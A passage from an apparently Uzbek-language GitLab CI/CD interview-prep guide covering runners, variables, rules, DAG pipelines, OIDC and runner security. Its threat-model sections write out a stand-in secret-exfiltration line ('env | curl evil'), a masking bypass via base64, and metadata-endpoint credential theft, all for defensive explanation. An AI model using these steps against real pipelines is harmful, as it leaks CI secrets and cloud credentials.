- `stages` yozilmasa default: `.pre, build, test, deploy, .post`. `stage` ko'rsatilmagan job — `test`.
- Bir stage'dagi job fail bo'lsa — keyingi stage'lar ishlamaydi.
- Har job alohida muhit (konteyner): fayllar job'lar orasida faqat artifact/cache orqali.

**Tuzoqlar:**
- Fayl o'tadi deb o'ylash — `build` dagi `app` ni `deploy` da ishlatish uchun artifact kerak.
- Stage'lar ko'p va ketma-ket — pipeline sekin; `needs` bilan DAG qil.
- Job nomi `.` bilan boshlansa (`.template`) — u ishlamaydi (hidden job).

**Senior nuqta:** Stage — vizual va oddiy model, lekin katta pipeline'larda `needs` (DAG) critical path'ni sezilarli qisqartiradi. Stage'larni mantiqiy guruh sifatida qoldirib, bajarilish tartibini `needs` bilan boshqar.

32016.a:
**Qisqa javob:** GitLab Runner — job'larni bajaradigan agent (alohida dastur). U GitLab'ga o'zi murojaat qilib (poll), navbatdagi job'ni oladi — shuning uchun runner'ga kiruvchi port ochish kerak emas. Executor — runner job'ni qayerda va qanday izolyatsiya bilan bajarishini belgilaydi: shell (to'g'ridan-to'g'ri host'da), docker (har job yangi konteyner), kubernetes (har job yangi pod) va boshqalar.

**Qanday ishlaydi:**
```
GitLab (job navbati)
    ^  poll: "menga job bormi?" (har 3s)
    |
GitLab Runner (sening serveringda / K8s'da)
    |  executor
    v
docker run golang:1.23 -> script -> loglar GitLab'ga -> konteyner o'chadi
```

**Runner turlari:** instance (shared, hamma loyihalar uchun), group, project. `tags:` bilan job kerakli runner'ga yo'naltiriladi.

| Executor | Izolyatsiya | Qachon |
|---|---|---|
| shell | yo'q, host'da | maxsus hardware, ishonchli muhit |
| docker | har job konteyner | eng keng tarqalgan |
| docker-autoscaler | cloud VM'larda autoscale | o'zgaruvchan yuk |
| kubernetes | har job pod | K8s bor bo'lsa |

**Amalda:**
```bash
gitlab-runner register \
  --url https://gitlab.example.com \
  --token glrt-xxxxx \
  --executor docker \
  --docker-image alpine:3.20
gitlab-runner list
gitlab-runner verify
```
Yangi registratsiya: runner UI'da yaratilib, `glrt-` authentication token bilan (eski registration token deprecated).
```yaml
gpu-train:
  tags: [gpu, linux]
  script: python train.py
```

**Tuzoqlar:**
- Shell executor bir nechta loyiha uchun — bir job boshqasining fayllari va credential'larini ko'radi.
- `tags` yo'q job, runner esa faqat tag'li job'larni oladi (`run_untagged=false`) — job "pending" da qotadi.
- `privileged = true` docker runner — konteynerdan host'ni egallash mumkin.

**Senior nuqta:** Production uchun ephemeral izolyatsiya (docker yoki kubernetes) va workload bo'yicha ajratilgan runner'lar (build / prod-deploy / GPU). Deploy runner'i faqat protected branch job'larini olsin.

32017.a:
**Qisqa javob:** `variables:` — YAML'da yoziladigan muhit o'zgaruvchilari (maxfiy bo'lmagan konfiguratsiya). CI/CD variables — loyiha/guruh/instance sozlamalarida saqlanadigan qiymatlar; ular Protected (faqat protected branch/tag pipeline'larida), Masked (logda yashirilgan) yoki File turida bo'lishi mumkin. GitLab yana yuzlab predefined o'zgaruvchilar beradi (`CI_COMMIT_SHA`, `CI_REGISTRY_IMAGE`...).

**Amalda:**
```yaml
variables:
  GO_VERSION: "1.23"
  CGO_ENABLED: "0"

build:
  image: golang:$GO_VERSION
  script:
    - echo "Commit $CI_COMMIT_SHORT_SHA, branch $CI_COMMIT_REF_NAME"
    - go build -ldflags "-X main.version=$CI_COMMIT_SHA" ./...

deploy:
  variables:
    ENV: staging          # job darajasi
  script: ./deploy.sh "$ENV" "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA"
```
Maxfiy qiymat — UI'da: Settings -> CI/CD -> Variables -> `DEPLOY_TOKEN` (Protected + Masked and hidden).

**Foydali predefined o'zgaruvchilar:**

| O'zgaruvchi | Ma'nosi |
|---|---|
| `CI_COMMIT_SHA` / `CI_COMMIT_SHORT_SHA` | commit |
| `CI_COMMIT_REF_NAME` / `CI_COMMIT_BRANCH` / `CI_COMMIT_TAG` | branch yoki tag |
| `CI_PIPELINE_SOURCE` | push, merge_request_event, schedule... |
| `CI_REGISTRY_IMAGE` | loyiha registry yo'li |
| `CI_DEFAULT_BRANCH` | odatda main |

**Ustunlik (yuqoridan pastga):** trigger/manual/scheduled pipeline o'zgaruvchilari > project > group > instance > YAML job `variables` > YAML global `variables` > predefined.

**Tuzoqlar:**
- Parolni `.gitlab-ci.yml` ga yozish — Git tarixida abadiy.
- Protected variable unprotected branch'da bo'sh — "nega staging deploy ishlamayapti" holati.
- Masking talablari (minimal uzunlik, ruxsat etilgan belgilar) — mos kelmasa mask qilib bo'lmaydi.
- File turidagi variable'da `$VAR` — fayl yo'li, mazmun emas.

**Senior nuqta:** Prod secret'lari faqat Protected + Masked, va iloji bo'lsa umuman variable emas — OIDC (`id_tokens`) yoki Vault integratsiyasi (`secrets:` kaliti) orqali qisqa muddatli.

32018.a:
**Qisqa javob:** `image` — job qaysi Docker image ichida bajarilishini belgilaydi (masalan `golang:1.23`). `services` — job davomida yonida ishga tushadigan qo'shimcha konteynerlar (PostgreSQL, Redis) — integration testlar uchun; ular `alias` (yoki image nomidan hosil bo'lgan) hostname orqali mavjud. Faqat docker va kubernetes executor'larda ishlaydi.

**Qanday ishlaydi:**
```
job "test"
  +-- asosiy konteyner: golang:1.23   (script shu yerda)
  +-- service:          postgres:16   hostname "db"
  +-- service:          redis:7       hostname "redis"
  job tugadi -> hammasi o'chiriladi
```

**Amalda:**
```yaml
test:
  image: golang:1.23
  services:
    - name: postgres:16
      alias: db
    - name: redis:7-alpine
      alias: cache
  variables:
    POSTGRES_PASSWORD: test
    POSTGRES_DB: app
    DATABASE_URL: "postgres://postgres:test@db:5432/app?sslmode=disable"
    REDIS_ADDR: "cache:6379"
  script:
    - until pg_isready -h db -U postgres; do sleep 1; done   # tayyorligini kutish
    - go test -tags=integration ./...
```
`variables` service konteynerlariga ham uzatiladi — `POSTGRES_PASSWORD` shu sababli ishlaydi.

**Hostname qoidasi:** alias bo'lmasa — `postgres:16` -> `postgres`; `registry.example.com/team/my-db:1` -> `registry.example.com__team__my-db` va `registry.example.com-team-my-db`. Alias ishlatish aniqroq.

**Tuzoqlar:**
- Service hali tayyor emas, test darhol boshlanadi — "connection refused"; tayyorlikni kut.
- `localhost` ga ulanish — docker executor'da service alohida konteyner (kubernetes executor'da esa bitta pod, `localhost` ishlaydi) — alias ishlat, ikkalasida ham ishlaydi.
- `image:` da `latest` — kutilmagan yangilanish build'ni buzadi; versiya (yoki digest) pin qil.

**Senior nuqta:** Integration testlar uchun services oddiy va tez; murakkab topologiya kerak bo'lsa testcontainers (Docker socket kerak) yoki ephemeral review environment ko'rib chiq.

32019.a:
**Qisqa javob:** Artifact — job natijasi (binary, hisobot): GitLab serverida saqlanadi, keyingi stage job'lariga avtomatik beriladi, `expire_in` gacha kafolatlangan va UI'dan yuklab olinadi. Cache — tezlik uchun dependency'lar (`go mod`, `node_modules`): runner tomonida (lokal yoki S3) saqlanadi, kafolat yo'q — yo'q bo'lsa ham pipeline to'g'ri ishlashi shart.

**Taqqoslash:**

| | Artifact | Cache |
|---|---|---|
| Maqsad | natijani uzatish/saqlash | tezlashtirish |
| Qayerda | GitLab server (object storage) | runner (lokal yoki S3/GCS) |
| Kafolat | ha, `expire_in` gacha | yo'q |
| Keyingi job'lar | default oladi | `key` mos kelsa |
| Pipeline'lar orasida | yo'q (asosan) | ha |

**Amalda:**
```yaml
variables:
  GOPATH: $CI_PROJECT_DIR/.go     # cache faqat loyiha papkasi ichida ishlaydi

build:
  image: golang:1.23
  cache:
    key:
      files: [go.sum]             # go.sum o'zgarsa yangi cache
    paths: [.go/pkg/mod]
  script: go build -o app ./cmd/app
  artifacts:
    paths: [app]
    expire_in: 1 week
    reports:
      junit: report.xml           # MR'da test natijalari

deploy:
  needs: [build]                  # faqat build artifact'ini oladi
  script: ./deploy.sh ./app
```

**Cache policy:** ko'p job o'qiydi, bittasi yozadi:
```yaml
cache: {key: {files: [go.sum]}, paths: [.go/pkg/mod], policy: pull}
```

**Tuzoqlar:**
- Cache path loyiha papkasidan tashqarida (`~/go/pkg/mod`) — saqlanmaydi; `GOPATH` ni ichkariga ko'chir.
- Artifact'ni cache o'rnida ishlatish — har job katta fayllarni yuklaydi, storage o'sadi.
- `expire_in` yo'q — artifact'lar instance default'igacha (ko'pincha 30 kun) qoladi; disk to'ladi.
- Turli runner'lar lokal cache'ni bo'lishmaydi — distributed cache (S3) kerak.

**Senior nuqta:** Artifact'larni minimal qil (faqat keyingi job'ga kerakli) va `needs`/`dependencies` bilan aniq yo'naltir — katta monorepo'da bu pipeline vaqtini sezilarli kamaytiradi.

32020.a:
**Qisqa javob:** `rules` — job pipeline'ga qo'shilishi va qanday (`on_success`, `manual`, `delayed`, `never`) qo'shilishini belgilaydigan zamonaviy mexanizm: `if` (o'zgaruvchilar ifodasi), `changes`, `exists` shartlari tartib bilan tekshiriladi, birinchi mos kelgani qo'llanadi. `only/except` — eski, cheklangan sintaksis (deprecated emas, lekin rivojlanmayapti); ikkalasini bitta job'da aralashtirib bo'lmaydi.

**Qanday ishlaydi:**
```
rules ro'yxati yuqoridan pastga:
  rule 1 mos? -> ha -> uning when/allow_failure/variables qo'llanadi, STOP
  rule 2 mos? -> ...
  hech biri mos emas -> job pipeline'ga QO'SHILMAYDI
```

**Amalda:**
```yaml
deploy:
  script: ./deploy.sh
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual                   # main'da - qo'lda tugma
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes: [k8s/**/*]            # MR'da faqat k8s o'zgarsa
      when: on_success
    - when: never                    # boshqa hollarda yo'q

tests:
  script: go test ./...
  rules:
    - if: $CI_COMMIT_MESSAGE =~ /\[skip tests\]/
      when: never
    - when: on_success
```
Eski sintaksis (taqqoslash uchun):
```yaml
deploy:
  only: [main]
  except: [schedules]
```

**`rules` afzalliklari:** murakkab mantiq (AND/OR, regex), `when: manual/delayed` shartga qarab, rule bo'yicha `variables` va `allow_failure`, `changes: compare_to`, `workflow:rules` bilan butun pipeline'ni boshqarish.

**Tuzoqlar:**
- Hech bir rule mos kelmasa job qo'shilmaydi — "job yo'qolib qoldi" muammosi; oxiriga aniq `- when: never` yoki `- when: on_success` qo'y.
- `changes` branch push'da (MR'siz) yangi branch uchun har doim `true` — `compare_to: refs/heads/main` ishlat.
- `when: manual` rule'da `allow_failure` default `false` — pipeline "blocked" bo'lib turadi.
- `rules` va `only` ni bitta job'da — sintaksis xatosi.

**Senior nuqta:** Umumiy rule to'plamlarini hidden job'larda saqlab `!reference [.rules-mr, rules]` bilan qayta ishlat — 50 job'da bir xil mantiqni takrorlamaslik uchun.

32021.a:
**Qisqa javob:** `needs` job'lar orasida aniq bog'liqlik o'rnatib DAG (yo'naltirilgan graf) yaratadi: job o'zi bog'liq bo'lgan job'lar tugashi bilan boshlanadi, butun oldingi stage'ni kutmaydi. Natija — critical path qisqaradi, pipeline tezlashadi. Bundan tashqari `needs` artifact'larni ham faqat ko'rsatilgan job'lardan oladi.

**Stage va DAG:**
```
Stage model:
  build:  [build-a 2m] [build-b 10m]
  test:   [test-a] [test-b]           <- ikkalasi build-b (10m) ni kutadi
  jami: ~10m + test

DAG (needs):
  build-a 2m --> test-a      (2-daqiqada boshlanadi)
  build-b 10m --> test-b
  lint (needs: []) darhol
```

**Amalda:**
```yaml
stages: [build, test, deploy]

lint:
  stage: test
  needs: []                 # hech narsani kutmaydi, pipeline boshida
  script: make lint

build-a:
  stage: build
  script: make build-a
  artifacts: {paths: [dist/a]}

test-a:
  stage: test
  needs: [build-a]          # faqat build-a ni kutadi va uning artifact'ini oladi
  script: make test-a

deploy-a:
  stage: deploy
  needs:
    - job: test-a
      artifacts: false      # test artifact'i kerak emas
    - build-a
  script: ./deploy.sh dist/a
```

**Qo'shimcha imkoniyatlar:**
- `needs: optional: true` — job pipeline'da bo'lmasa ham (rules bilan o'chirilgan) xato bermaydi.
- Bir stage ichida ham `needs` mumkin (stage'siz pipeline).
- Limit: bitta job'da 50 tagacha needs.

**Tuzoqlar:**
- `needs` dagi job `rules` bilan pipeline'ga qo'shilmagan — "needs job not found" xatosi; `optional: true`.
- `needs` bilan artifact faqat ko'rsatilgan job'lardan — boshqa kerakli artifact yo'q bo'lib qoladi.
- Monorepo'da `changes` + `needs` ehtiyotsiz ishlatilsa grafda "teshik" paydo bo'ladi.

**Senior nuqta:** Pipeline'ni GitLab "Needs" (DAG) vizualizatsiyasida ko'r va critical path'ni o'lcha — optimizatsiya faqat shu yo'ldagi job'larga ta'sir qiladi.

32022.a:
**Qisqa javob:** `include` — boshqa YAML fayllarni pipeline'ga ulaydi (shu repo'dan, boshqa loyihadan, URL'dan yoki GitLab shablonlaridan). `extends` — job'ga boshqa (odatda hidden, `.` bilan boshlanadigan) job'ning kalitlarini meros qilib beradi. Zamonaviy yo'l — CI/CD Components: versiyalangan, input'li, katalogda e'lon qilinadigan qayta ishlatiladigan bloklar.

**Amalda:**
```yaml
include:
  - local: ci/lint.yml                          # shu repo
  - project: platform/ci-templates              # boshqa loyiha
    ref: v2.1.0                                 # pin qilingan versiya
    file: /go.yml
  - template: Jobs/SAST.gitlab-ci.yml           # GitLab shabloni
  - component: $CI_SERVER_FQDN/platform/components/go-test@1.4.0
    inputs:
      go_version: "1.23"

.go-base:                                       # hidden job - shablon
  image: golang:1.23
  before_script: [go mod download]
  cache: {key: {files: [go.sum]}, paths: [.go/pkg/mod]}

test:
  extends: .go-base
  script: go test ./...

build:
  extends: .go-base
  script: go build ./...
```

**Merge qoidasi (`extends`):**
- Hash (map) kalitlar chuqur birlashtiriladi (`variables`, `cache`).
- Massivlar (`script`, `rules`) **almashtiriladi**, qo'shilmaydi.
- Bir nechta: `extends: [.go-base, .k8s-deploy]` — keyingisi ustun.

**Component misoli (`templates/go-test.yml`):**
```yaml
spec:
  inputs:
    go_version: {default: "1.23"}
---
go-test:
  image: golang:$[[ inputs.go_version ]]
  script: go test ./...
```

**Tuzoqlar:**
- `include` da `ref: main` — platform jamoasining har o'zgarishi hamma pipeline'ni bir zumda buzadi; tag'ga pin qil.
- `extends` bilan `script` qo'shilmoqchi bo'lish — almashtiriladi; `!reference` ishlat.
- Juda chuqur meros zanjiri — job qayerdan nima olganini tushunish qiyin; "Full configuration" ko'rinishi (Pipeline editor) bilan tekshir.

**Senior nuqta:** Yangi platform shablonlarini Components sifatida chiqar: semver, input validatsiyasi, CI/CD Catalog'da hujjat — `include: project` ga nisbatan aniqroq kontrakt.

32023.a:
**Qisqa javob:** `environment` job'ni deploy maqsadiga (staging, production, review/feature-x) bog'laydi: GitLab deploy tarixini, joriy versiyani, URL'ni ko'rsatadi va rollback imkonini beradi. `when: manual` job'ni qo'lda tugma bilan ishga tushiriladigan qiladi (prod gate). Review app — har MR uchun avtomatik yaratiladigan vaqtinchalik muhit (`environment: name: review/$CI_COMMIT_REF_SLUG`), MR yopilganda o'chiriladi.

**Review app oqimi:**
```
MR ochildi -> review job: helm install app-42 -> https://feature-x.dev.example.com
MR'da "View app" tugmasi
MR merge/yopildi -> stop-review (on_stop) -> helm uninstall
yoki auto_stop_in: 2 days o'tdi -> avtomatik stop
```

**Amalda:**
```yaml
review:
  stage: deploy
  script:
    - helm upgrade --install "app-$CI_MERGE_REQUEST_IID" ./chart
        --set ingress.host="$CI_COMMIT_REF_SLUG.dev.example.com"
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_COMMIT_REF_SLUG.dev.example.com
    on_stop: stop-review
    auto_stop_in: 2 days
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"

stop-review:
  stage: deploy
  script: helm uninstall "app-$CI_MERGE_REQUEST_IID"
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      when: manual

deploy-prod:
  stage: deploy
  script: ./deploy.sh production
  environment: {name: production, url: https://app.example.com}
  resource_group: production
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
```

**Himoya:** Protected environments — faqat ruxsat etilgan foydalanuvchi/guruh deploy qila oladi, kerak bo'lsa N ta approval talab qilinadi. `resource_group` — bir environment'ga parallel deploy'ni taqiqlaydi.

**Tuzoqlar:**
- `on_stop` job'i yo'q yoki ishlamaydi — review muhitlar to'planib, cluster resurslari va pul yeyiladi.
- `CI_COMMIT_REF_SLUG` uzun bo'lsa DNS nomi 63 belgidan oshadi.
- Review app'lar prod secret'lari bilan — alohida, cheklangan credential'lar ishlat.

**Senior nuqta:** Review app'lar uchun TTL (`auto_stop_in`) va cluster darajasida cleanup (masalan, label bo'yicha eski namespace'larni o'chiruvchi cron) — ikki qavatli himoya.

32024.a:
**Qisqa javob:** Parent-child pipeline — bitta loyiha ichida asosiy pipeline `trigger: include:` orqali alohida child pipeline'larni ishga tushiradi (monorepo'da har servis uchun, yoki dinamik generatsiya qilingan YAML bilan). Multi-project pipeline — `trigger: project:` orqali boshqa loyihaning pipeline'ini ishga tushirish (masalan, kutubxona release'dan keyin ilovani qayta build qilish). `strategy: depend` bilan parent child natijasini kutadi va uni o'z holatiga aks ettiradi.

**Tuzilma:**
```
Parent pipeline (monorepo)
  +-- trigger billing -> child: services/billing/.gitlab-ci.yml
  +-- trigger auth    -> child: services/auth/.gitlab-ci.yml
  +-- generate -> child.yml (artifact) -> trigger dynamic child

Multi-project:
  lib-repo pipeline --trigger--> app-repo pipeline (downstream)
```

**Amalda (monorepo):**
```yaml
billing:
  trigger:
    include: services/billing/.gitlab-ci.yml
    strategy: depend
  rules:
    - changes: [services/billing/**/*, pkg/**/*]

# dinamik
generate:
  script: ./ci/gen.sh > child.yml        # o'zgargan servislarga qarab YAML
  artifacts: {paths: [child.yml]}

run-child:
  needs: [generate]
  trigger:
    include:
      - artifact: child.yml
        job: generate
    strategy: depend
```
Multi-project:
```yaml
deploy-app:
  trigger:
    project: acme/app
    branch: main
    strategy: depend
  variables:
    LIB_VERSION: $CI_COMMIT_TAG
```

**Qachon nima:**

| Holat | Yechim |
|---|---|
| Monorepo, servislar mustaqil | parent-child + `rules: changes` |
| Pipeline tuzilishi kod bilan aniqlanadi | dinamik child |
| Boshqa repo'ni ishga tushirish | multi-project |
| Oddiy kombinatsiyalar | `parallel: matrix` yetadi |

**Tuzoqlar:**
- `strategy: depend` yo'q — parent child'ni kutmaydi va yashil bo'ladi, child fail bo'lsa ham.
- Child pipeline parent o'zgaruvchilarini avtomatik olmaydi — `trigger: forward:` bilan.
- Ichma-ichlik chuqurligi limiti (2 daraja child) va trigger qiluvchi foydalanuvchida downstream loyihada huquq bo'lishi kerak.

**Senior nuqta:** Child pipeline'lar har servisga o'z `.gitlab-ci.yml` egaligini beradi (CODEOWNERS bilan) — platforma umumiy qoidalarni parent'da, jamoalar o'z tafsilotlarini child'da boshqaradi.

32025.a:
**Qisqa javob:** Model: protected branch'larga faqat ruxsat etilganlar (odatda Maintainer) push/merge qiladi; protected variable'lar faqat protected branch/tag pipeline'larida beriladi. Shunda prod secret'lari faqat review qilingan koddan ishlaydi. Teshik: Developer `.gitlab-ci.yml` ni o'zgartira oladi = o'z branch'ida istalgan kodni runner'da bajaradi; agar prod secret protected bo'lmasa, yoki shared runner'da credential qolsa, yoki protected branch'ga merge nazoratsiz bo'lsa — himoya buziladi.

**Qanday ishlaydi:**
```
feature-x (unprotected) pipeline:
  Developer .gitlab-ci.yml ga "env | curl evil" yozdi
  -> protected variable'lar YO'Q -> faqat oddiy variable'lar sizadi

main (protected) pipeline:
  faqat MR approval'dan keyin -> protected PROD_TOKEN beriladi
```

**Teshiklar va yopish:**

| Teshik | Yopish |
|---|---|
| Prod secret oddiy (unprotected) variable | Protected + Masked and hidden |
| Developer protected branch'ga merge qila oladi | Allowed to merge: Maintainers, MR approval rules |
| `.gitlab-ci.yml` o'zgarishi review'siz | CODEOWNERS: `.gitlab-ci.yml @platform` + code owner approval |
| Protected tag'lar sozlanmagan | `v*` tag — faqat Maintainer |
| Shared runner'da oldingi job qoldiqlari | ephemeral executor, prod deploy uchun alohida runner |
| Security scan'ni olib tashlash | pipeline execution policy |
| Masking chetlab o'tiladi (`echo $X | base64`) | secret'ni umuman bermaslik: OIDC, Vault |

**Amalda (prod deploy):**
```yaml
deploy-prod:
  environment: production         # protected environment + approval
  tags: [prod-deployer]           # faqat protected ref'larni oladigan runner
  rules:
    - if: $CI_COMMIT_TAG =~ /^v\d+/
  id_tokens:
    VAULT_ID_TOKEN: {aud: https://vault.example.com}
  secrets:
    DB_PASSWORD:
      vault: prod/db/password@kv
```
Runner'ni faqat protected ref'lar uchun sozlash: runner sozlamasida "Protected" belgisi.

**Tuzoqlar:**
- "Masked = xavfsiz" — mask faqat log'dagi aniq qiymatni yashiradi, o'zgartirilganini emas.
- Fork MR pipeline'lari parent loyihada ishga tushirilsa (maintainer "Run pipeline" bosgan) — fork kodi parent secret'lari bilan; avval kodni ko'rib chiq.

**Senior nuqta:** Asosiy savol: "Kim prod secret'li pipeline'da kod bajara oladi?" Javob "faqat review qilingan protected ref" bo'lishi va buni runner, variable, environment va approval qatlamlari birga ta'minlashi kerak.

32026.a:
**Qisqa javob:** `CI_JOB_TOKEN` — har job uchun avtomatik, qisqa muddatli token: GitLab API'ning cheklangan qismiga (boshqa loyihaning package/registry, artifact, trigger) job'ni ishga tushirgan foydalanuvchi huquqlari doirasida kirish uchun. `id_tokens` — job uchun OIDC JWT chiqaradi; tashqi tizimlar (AWS, GCP, Azure, Vault) uni qabul qilib, vaqtinchalik credential beradi — CI'da uzoq yashovchi cloud kaliti kerak bo'lmaydi.

**OIDC oqimi:**
```
job (id_tokens: AWS_TOKEN aud=sts.amazonaws.com)
  JWT claim'lari: sub=project_path:grp/app:ref_type:branch:ref:main
                  project_path, ref, ref_protected, environment ...
  -> AWS STS AssumeRoleWithWebIdentity
     trust policy: sub mosmi?
  -> 1 soatlik credential
```

**Amalda:**
```yaml
deploy:
  image: amazon/aws-cli:2.17.0
  id_tokens:
    AWS_TOKEN:
      aud: sts.amazonaws.com
  script:
    - >
      export $(printf "AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s"
      $(aws sts assume-role-with-web-identity
      --role-arn "$ROLE_ARN" --role-session-name "gl-$CI_JOB_ID"
      --web-identity-token "$AWS_TOKEN" --duration-seconds 3600
      --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text))
    - aws sts get-caller-identity
```
AWS trust policy sharti:
```json
"Condition": {"StringEquals": {
  "gitlab.example.com:aud": "sts.amazonaws.com",
  "gitlab.example.com:sub": "project_path:grp/app:ref_type:branch:ref:main"}}
```

**CI_JOB_TOKEN ishlatish:**
```bash
curl --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "$CI_API_V4_URL/projects/99/packages/generic/lib/1.2.0/lib.tar.gz" -o lib.tar.gz
```
Boshqa loyiha kirishiga ruxsat: o'sha loyihada Settings -> CI/CD -> Job token permissions -> allowlist'ga qo'shish (default: faqat allowlist'dagi loyihalar).

**Tuzoqlar:**
- `sub` sharti keng (`project_path:grp/*`) yoki `StringLike` bilan `*` — har qanday branch, hatto feature branch prod rolini oladi.
- Prod uchun `ref_protected: "true"` claim'ini tekshirmaslik.
- Job token allowlist'ni "hammaga ochiq" qilish (eski default) — har loyiha job'i kirishi mumkin.

**Senior nuqta:** Prod rolini `ref` va `environment` claim'lariga bog'la va protected environment approval bilan birlashtir — OIDC shunda faqat review qilingan, tasdiqlangan deploy'ga ochiladi.

32027.a:
**Qisqa javob:** Avval o'lcha (critical path qaysi job'lar), keyin: faqat o'zgargan qismlarni ishga tushir (`rules: changes` + `compare_to`, parent-child), stage to'siqlarini `needs` bilan olib tashla, testlarni `parallel` bilan shard qil, cache'ni to'g'ri sozla (`key: files`, `policy: pull`), tayyor CI image'lar va Docker layer cache ishlat, eski pipeline'larni `interruptible` bilan bekor qil.

**Qayerdan vaqt ketadi:**
```
har commit'da 40 servis build    -> faqat o'zgarganlar (changes)
stage barrier: lint 10m kutadi   -> needs: [] / DAG
1 ta 30 daqiqalik test job       -> parallel: 6 shard
har job apt-get install ...      -> prebuilt CI image
har job go mod download          -> cache key=go.sum, policy: pull
eski commit pipeline'lari        -> interruptible + auto-cancel
```

**Amalda:**
```yaml
.billing-changes:
  rules:
    - changes:
        paths: [services/billing/**/*, pkg/**/*, go.mod]
        compare_to: refs/heads/main

billing-build:
  extends: .billing-changes
  needs: []
  image: registry.example.com/ci/go:1.23     # oldindan tayyorlangan image
  cache:
    key: {files: [go.sum]}
    paths: [.go/pkg/mod]
    policy: pull                              # faqat o'qiydi
  interruptible: true
  script: make -C services/billing build

billing-test:
  extends: .billing-changes
  needs: [billing-build]
  parallel: 4
  interruptible: true
  script: make -C services/billing test SHARD=$CI_NODE_INDEX/$CI_NODE_TOTAL

warm-cache:                                   # cache'ni faqat shu yozadi
  rules: [{if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH}]
  cache: {key: {files: [go.sum]}, paths: [.go/pkg/mod], policy: push}
  script: go mod download
```

**O'lchash:** CI/CD Analytics (pipeline duration), job'lar bo'yicha vaqt (API: `/pipelines/:id/jobs`), runner queue duration.

**Tuzoqlar:**
- `changes` shared kutubxona (`pkg/`) o'zgarishini o'tkazib yuboradi — dependency grafini filter'ga kirit, yoki Bazel/Nx kabi graf asosidagi tool.
- Runner yetishmasa parallellik foyda bermaydi — queue time o'sadi.
- Cache juda katta — restore build'dan sekin.

**Senior nuqta:** Maqsad metrikasi — MR'dan natijagacha p50/p95 vaqt. Har optimizatsiyadan oldin va keyin o'lcha; ko'pincha eng katta yutuq `needs` va prebuilt image'dan keladi.

32028.a:
**Qisqa javob:** Muammo — semantik konflikt: A va B MR'lar alohida yashil, lekin main'ga birga tushganda buziladi (biri funksiya imzosini o'zgartirdi, ikkinchisi eski imzo bilan yangi chaqiruv qo'shdi). Merged results pipeline MR'ni source branch'da emas, source + target birlashtirilgan vaqtinchalik commit'da tekshiradi. Merge train esa navbatdagi MR'larni ketma-ket birlashtirib (A, A+B, A+B+C) parallel tekshiradi va faqat yashillarini tartib bilan merge qiladi.

**Merge train:**
```
train: [A] [B] [C]
  pipeline 1: main + A
  pipeline 2: main + A + B        (parallel)
  pipeline 3: main + A + B + C
A yashil -> merge; B qizil -> B train'dan chiqadi,
  C uchun qayta: main + A + C
```

**Amalda:**
- Settings -> Merge requests -> "Enable merged results pipelines" va "Enable merge trains".
- Pipeline'lar MR pipeline bo'lishi kerak:
```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

e2e:
  rules:
    - if: $CI_MERGE_REQUEST_EVENT_TYPE == "merge_train"   # og'ir testlar faqat train'da
  script: make e2e
```
`CI_MERGE_REQUEST_EVENT_TYPE`: `detached`, `merged_result`, `merge_train`.

**Trade-off'lar:**

| Foyda | Narx |
|---|---|
| main doim yashil | runner sarfi oshadi (har train pozitsiyasi pipeline) |
| rebase-and-retest qo'lda yo'q | flaky test butun train'ni qayta qurdiradi |
| ko'p jamoali repo'da tez merge | pipeline vaqti uzun bo'lsa train sekin harakatlanadi |

**Tuzoqlar:**
- Flaky testlar — train doimiy qayta quriladi; avval flaky'ni tuzat yoki quarantine.
- Pipeline'lar MR pipeline emas (faqat branch) — train ishlamaydi.
- Merged results commit vaqtinchalik — undan image build qilib deploy qilish noto'g'ri; deploy main'dagi haqiqiy commit'dan.

**Senior nuqta:** GitHub'dagi analogi — merge queue. Ikkalasida ham qoida bir xil: tez check'lar MR'da (feedback), qimmat testlar train'da (kafolat), flaky rate past bo'lishi shart.

32029.a:
**Qisqa javob:** Shared runner'da turli loyihalar, ba'zan ishonchsiz kod, bir infratuzilmada ishlaydi. Asosiy xavflar: privileged konteyner (DinD) orqali host'ni egallash, job'lar orasida qolgan fayl/credential, runner'ning cloud roli orqali kirish, va supply chain (o'zgaruvchan image tag'lar, tashqi registry, zararli dependency). Yechim: ephemeral izolyatsiya, privileged'siz build, alohida prod runner'lar, pin qilingan image'lar, dependency proxy va imzolangan artifact'lar.

**Xavf xaritasi:**
```
job (ishonchsiz kod)
  |-- privileged + DinD -> /dev, kernel -> HOST ROOT
  |-- persistent runner  -> oldingi job'ning ~/.docker/config.json, cache
  |-- node IAM roli      -> IMDS 169.254.169.254 -> cloud credential
  |-- image: golang:latest -> registry'da tag almashtirilgan
  |-- go get / npm install -> typosquatting paket
```

**Choralar:**

| Xavf | Chora |
|---|---|
| privileged DinD | Buildah / BuildKit rootless, alohida build node pool |
| job qoldiqlari | kubernetes yoki docker-autoscaler executor, har job yangi pod/VM |
| node roli | IMDS'ni bloklash, cloud'ga faqat `id_tokens` (OIDC) |
| prod credential | alohida runner, `tags: [prod]`, faqat protected ref |
| image tag | digest bilan pin: `golang:1.23@sha256:...` |
| tashqi registry | Dependency Proxy / ichki mirror, allowlist |
| artifact soxtaligi | cosign imzo, SLSA provenance |

**Amalda (runner `config.toml` parchasi):**
```toml
[[runners]]
  executor = "kubernetes"
  [runners.kubernetes]
    privileged = false
    allowed_images = ["registry.example.com/ci/*", "golang:*"]
    namespace = "ci-jobs"
    [runners.kubernetes.pod_security_context]
      run_as_non_root = true
```
```yaml
build:
  image: golang:1.23@sha256:<digest>
  script:
    - go build ./...
```
GitLab Dependency Proxy: `image: ${CI_DEPENDENCY_PROXY_GROUP_IMAGE_PREFIX}/golang:1.23`.

**Tuzoqlar:**
- "Faqat ichki jamoa ishlatadi" — buzilgan dasturchi akkaunti yoki zararli dependency ham ichkaridan keladi.
